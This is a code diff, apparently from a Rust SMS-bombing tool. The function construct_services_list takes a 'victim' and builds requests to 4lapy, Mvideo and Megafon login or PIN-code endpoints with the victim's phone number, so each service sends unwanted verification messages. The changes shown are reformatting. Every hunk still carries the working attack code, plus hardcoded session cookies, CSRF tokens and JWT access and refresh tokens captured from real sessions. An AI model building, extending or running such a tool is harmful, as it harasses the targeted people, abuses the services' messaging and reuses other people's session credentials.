@@ -79,13 +79,13 @@ pub fn construct_services_list(victim: Victim) -> Vec<Service> {
                     body_type: BodyType::Form,
                     body: Default::default(),
                 };
-            
+
                 let mut phone = victim.phone.clone();
                 phone.format(WithPlus);
                 service.body = json!({
                     "phone": phone.phone
                 });
-            
+
                 services.push(service);
             }
             // 4lapy
@@ -99,14 +99,14 @@ pub fn construct_services_list(victim: Victim) -> Vec<Service> {
                     body_type: BodyType::JSON,
                     body: Default::default(),
                 };
-            
+
                 service.headers.insert("Cookie", r#"currentPage=%2Flandings%2Fdobrolap%2F; previousPage=%2F; 4lapy_site_v5=new; 4lapy_site_force=true; NEXT_CUSTOMER_TOKEN=%7B%22accessToken%22%3A%22eyJhbGciOiJSUzI1NiIsInR5cCIgOiAiSldUIiwia2lkIiA6ICJ6TzRUSGllX05QTW5uWkFQOXFLZC1FaElvbGNCY1dhSVFzUUdVLWJGVTc4In0.eyJleHAiOjE3MjMxMTc5NjEsImlhdCI6MTcyMzExNzY2MSwianRpIjoiZTdhY2UzNDAtNTNhMi00ODcyLWIyZDItMWQ0NzJlNmNkZjk5IiwiaXNzIjoiaHR0cHM6Ly9rZXljbG9hay5pbmZyYS9yZWFsbXMvY3VzdG9tZXIiLCJhdWQiOiJhY2NvdW50Iiwic3ViIjoiNWY0M2Q0ZmEtNDdhMi00ZGRlLWEwN2ItZTVhNWIyMGYyMTU1IiwidHlwIjoiQmVhcmVyIiwiYXpwIjoid2ViLWN1c3RvbWVyIiwic2Vzc2lvbl9zdGF0ZSI6IjU5ZjhhMDRjLWUzZmYtNDUzNS04ZDhiLTRlMDgwZWY1YTNjNyIsImFjciI6IjEiLCJyZWFsbV9hY2Nlc3MiOnsicm9sZXMiOlsib2ZmbGluZV9hY2Nlc3MiLCJ1bWFfYXV0aG9yaXphdGlvbiIsImRlZmF1bHQtcm9sZXMtY3VzdG9tZXIiXX0sInJlc291cmNlX2FjY2VzcyI6eyJhY2NvdW50Ijp7InJvbGVzIjpbIm1hbmFnZS1hY2NvdW50IiwibWFuYWdlLWFjY291bnQtbGlua3MiLCJ2aWV3LXByb2ZpbGUiXX19LCJzY29wZSI6InByb2ZpbGUgZW1haWwiLCJzaWQiOiI1OWY4YTA0Yy1lM2ZmLTQ1MzUtOGQ4Yi00ZTA4MGVmNWEzYzciLCJlbWFpbF92ZXJpZmllZCI6ZmFsc2UsImN1c3RvbWVySWQiOjkxNjcyNTM3LCJwcmVmZXJyZWRfdXNlcm5hbWUiOiJjYmZmNzFkNDFmZGI0OGQ1OThjZGM1ZWMxZGI1ZTUyOCJ9.Ournlzfj7p-IeI0zYR8AIx1JN8z7d_aJ-VIlzSYG7pkKRlah_94VFEP4TOkObBrd2PWi0lhuEAWB8WRcXfKpDh-nENd8rPUpN9qs0_kRq2Phb_Rv846sBFkuYHDXXk379cqFpA-Amo0ATXpNxyaY6ladj4LDCrs7R020zjGdbyvg8_XroTS8pOihZeW8LJMyrKSH0bPjQ5BTnMyidnU4bjVidTaWF4QL6Itv6gioCSUpdy2vXosqMkwn2_1VpRM-FgmeKWsbFgohHbA2Vx1tnvqmknNwJrf-kKPw_YIeRiyF7R3Wshxr26nnNz39FLDyHeKq6k0ihUDSF_MkpToQfQ%22%2C%22refreshToken%22%3A%22eyJhbGciOiJIUzI1NiIsInR5cCIgOiAiSldUIiwia2lkIiA6ICJlNWQ5MTc0Yi0yZWJjLTQ4ZmItOGM0NC03ZTg0M2E2ZmYxNmEifQ.eyJleHAiOjE3MjU3MDk2NjEsImlhdCI6MTcyMzExNzY2MSwianRpIjoiZWUwYzE1MDktZjBkMi00Zjk3LThjNDItNDMyMGVmNTdkZjhmIiwiaXNzIjoiaHR0cHM6Ly9rZXljbG9hay5pbmZyYS9yZWFsbXMvY3VzdG9tZXIiLCJhdWQiOiJodHRwczovL2tleWNsb2FrLmluZnJhL3JlYWxtcy9jdXN0b21lciIsInN1YiI6IjVmNDNkNGZhLTQ3YTItNGRkZS1hMDdiLWU1YTViMjBmMjE1NSIsInR5cCI6IlJlZnJlc2giLCJhenAiOiJ3ZWItY3VzdG9tZXIiLCJzZXNzaW9uX3N0YXRlIjoiNTlmOGEwNGMtZTNmZi00NTM1LThkOGItNGUwODBlZjVhM2M3Iiwic2NvcGUiOiJwcm9maWxlIGVtYWlsIiwic2lkIjoiNTlmOGEwNGMtZTNmZi00NTM1LThkOGItNGUwODBlZjVhM2M3In0.L1Eao_rMK3uitZlkaAoBjATCR2P90RUlBWVxr-N56cw%22%2C%22tokenType%22%3A%22Bearer%22%2C%22expiresIn%22%3A300%2C%22sessionState%22%3A%2259f8a04c-e3ff-4535-8d8b-4e080ef5a3c7%22%2C%22scope%22%3A%22profile%20email%22%2C%22refreshExpiresIn%22%3A2592000%2C%22expiresAt%22%3A1723117961469%2C%22refreshExpiresAt%22%3A1725709661469%7D; g4c_x=1; _userGUID=0:lzl7rn6h:7sThR1GuZizvLXpg8tqkDPqYlire9LZT; dSesn=dd062781-f6e3-1bc6-a597-b1d859b692e7; _dvs=0:lzl7rn6h:aqZJzNtf1Q~QJQj23NMmPzXidgA~ctgK; location=%7B%22postalCode%22%3A%22101000%22%2C%22fiasId%22%3A%220c5b2444-70a0-4932-980c-b4dc0d3f02b5%22%2C%22kladrId%22%3A%227700000000000%22%2C%22rusRegionId%22%3A77%2C%22regionFiasId%22%3A%220c5b2444-70a0-4932-980c-b4dc0d3f02b5%22%2C%22regionName%22%3A%22%D0%9C%D0%BE%D1%81%D0%BA%D0%B2%D0%B0%20%D0%B3%D0%BE%D1%80%D0%BE%D0%B4%22%2C%22areaName%22%3A%22%20%22%2C%22cityName%22%3A%22%D0%9C%D0%BE%D1%81%D0%BA%D0%B2%D0%B0%22%2C%22settlementName%22%3A%22%22%2C%22streetName%22%3A%22%20%22%2C%22houseName%22%3A%22%20%22%2C%22flatName%22%3A%22%20%22%2C%22typeCode%22%3A%22region%22%2C%22typeName%22%3A%22%D0%B3%D0%BE%D1%80%D0%BE%D0%B4%22%2C%22value%22%3A%22%D0%B3%20%D0%9C%D0%BE%D1%81%D0%BA%D0%B2%D0%B0%22%2C%22geo_lat%22%3A%2255.75396%22%2C%22geo_lon%22%3A%2237.620393%22%2C%22timezone%22%3A%22UTC%2B3%22%2C%22streetShort%22%3A%22%22%2C%22streetType%22%3A%22%22%2C%22houseShort%22%3A%22%22%2C%22houseType%22%3A%22%22%2C%22blockName%22%3A%22%22%2C%22blockType%22%3A%22%22%7D; polygon=r468-10-14-14-18-18-22; _ga_GRN90Z74D3=GS1.1.1723117669.1.1.1723117749.44.0.0; _ga=GA1.1.1699357532.1723117670; rrpvid=962500276817422; tmr_lvid=886243903520ca301abd3c3dd7f6c5fd; tmr_lvidTS=1723117672164; rcuid=66b4b06d5a442c690dc06be2; _ym_uid=1723117678991205878; _ym_d=1723117678; _ym_isad=2; domain_sid=HUoqZbDBqQL6J3ihwirC9%3A1723117681381; tmr_detect=0%7C1723117683099; cookieShown=true"#.parse().unwrap());
-            
+
                 let phone = victim.phone.clone();
                 service.body = json!({
                     "phone": phone.phone
                 });
-            
+
                 services.push(service);
             }
             // Mvideo
@@ -120,7 +120,7 @@ pub fn construct_services_list(victim: Victim) -> Vec<Service> {
                     body_type: BodyType::JSON,
                     body: Default::default(),
                 };
-            
+
                 service.headers.insert(
                     "User-Agent",
                     r#"Mozilla/5.0 (X11; Linux x86_64; rv:129.0) Gecko/20100101 Firefox/129.0"#
@@ -180,7 +180,7 @@ pub fn construct_services_list(victim: Victim) -> Vec<Service> {
                     .headers
                     .insert("Priority", r#"u=0"#.parse().unwrap());
                 service.headers.insert("TE", r#"trailers"#.parse().unwrap());
-            
+
                 let mut phone = victim.phone.clone();
                 phone.format(WithPlus);
                 service.body = json!({
@@ -189,7 +189,7 @@ pub fn construct_services_list(victim: Victim) -> Vec<Service> {
                     "sendBy": "CASCADE",
                     "action": "SENT_PIN_CODE"
                 });
-            
+
                 services.push(service);
             }
 
@@ -207,22 +207,59 @@ pub fn construct_services_list(victim: Victim) -> Vec<Service> {
                 };
 
                 service.headers.insert("User-Agent", r#"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:129.0) Gecko/20100101 Firefox/129.0"#.parse().unwrap());
-                service.headers.insert("Accept", r#"application/json, text/plain, */*"#.parse().unwrap());
-                service.headers.insert("Accept-Language", r#"ru-RU,ru;q=0.8,en-US;q=0.5,en;q=0.3"#.parse().unwrap());
-                service.headers.insert("Accept-Encoding", r#"gzip, deflate, br, zstd"#.parse().unwrap());
-                service.headers.insert("Referer", r#"https://lk.megafon.ru/login"#.parse().unwrap());
-                service.headers.insert("Content-Type", r#"application/x-www-form-urlencoded; charset=UTF-8"#.parse().unwrap());
-                service.headers.insert("X-App-Type", r#"react_lk"#.parse().unwrap());
-                service.headers.insert("X-Cabinet-Capabilities", r#"web-2020"#.parse().unwrap());
-                service.headers.insert("traceparent", r#"00-3c12254297d2b3c78b6b333820442716-c1abbf0182398532-01"#.parse().unwrap());
-                service.headers.insert("Origin", r#"https://lk.megafon.ru"#.parse().unwrap());
-                service.headers.insert("Connection", r#"keep-alive"#.parse().unwrap());
+                service.headers.insert(
+                    "Accept",
+                    r#"application/json, text/plain, */*"#.parse().unwrap(),
+                );
+                service.headers.insert(
+                    "Accept-Language",
+                    r#"ru-RU,ru;q=0.8,en-US;q=0.5,en;q=0.3"#.parse().unwrap(),
+                );
+                service.headers.insert(
+                    "Accept-Encoding",
+                    r#"gzip, deflate, br, zstd"#.parse().unwrap(),
+                );
+                service
+                    .headers
+                    .insert("Referer", r#"https://lk.megafon.ru/login"#.parse().unwrap());
+                service.headers.insert(
+                    "Content-Type",
+                    r#"application/x-www-form-urlencoded; charset=UTF-8"#
+                        .parse()
+                        .unwrap(),
+                );
+                service
+                    .headers
+                    .insert("X-App-Type", r#"react_lk"#.parse().unwrap());
+                service
+                    .headers
+                    .insert("X-Cabinet-Capabilities", r#"web-2020"#.parse().unwrap());
+                service.headers.insert(
+                    "traceparent",
+                    r#"00-3c12254297d2b3c78b6b333820442716-c1abbf0182398532-01"#
+                        .parse()
+                        .unwrap(),
+                );
+                service
+                    .headers
+                    .insert("Origin", r#"https://lk.megafon.ru"#.parse().unwrap());
+                service
+                    .headers
+                    .insert("Connection", r#"keep-alive"#.parse().unwrap());
                 service.headers.insert("Cookie", r#"LB-lk.megafon.ru=ffffffff0978c6a545525d5f4f58455e445a4a423660; page_load_start=1723118955914; DEVICE-ID=ce6fe18a-64e7-45b6-84c3-f9a3cae5588a; CSRF-TOKEN=0b193280-3bfa-4104-8084-f002febc4cf4; JSESSIONID=dc7806f8-cb02-49c4-a4aa-2bcf7a0e22c6; AUTOLOGIN-CHAIN-SESSION-KEY=8fb705f1-2e73-4984-86da-f3c858d90454; USER-REFERENCE-ID=7lBhADJeoRq2AeHmdIG2hw; _ym_uid=1723118949631111238; _ym_d=1723118949; _ym_isad=2; _ymab_param=VxcsX2bLdzwzxnUVPLAxUnBMRoW6E9LXybZoebjUAX2SKTHMD_x0N-AqRpdoT-KTpUrNs8ccvFAvi2egoTqL6umIzBA"#.parse().unwrap());
-                service.headers.insert("Sec-Fetch-Dest", r#"empty"#.parse().unwrap());
-                service.headers.insert("Sec-Fetch-Mode", r#"cors"#.parse().unwrap());
-                service.headers.insert("Sec-Fetch-Site", r#"same-origin"#.parse().unwrap());
-                service.headers.insert("Priority", r#"u=0"#.parse().unwrap());
-                
+                service
+                    .headers
+                    .insert("Sec-Fetch-Dest", r#"empty"#.parse().unwrap());
+                service
+                    .headers
+                    .insert("Sec-Fetch-Mode", r#"cors"#.parse().unwrap());
+                service
+                    .headers
+                    .insert("Sec-Fetch-Site", r#"same-origin"#.parse().unwrap());
+                service
+                    .headers
+                    .insert("Priority", r#"u=0"#.parse().unwrap());
+
                 let mut phone = victim.phone.clone();
                 phone.format(Without7);
                 service.body = json!({
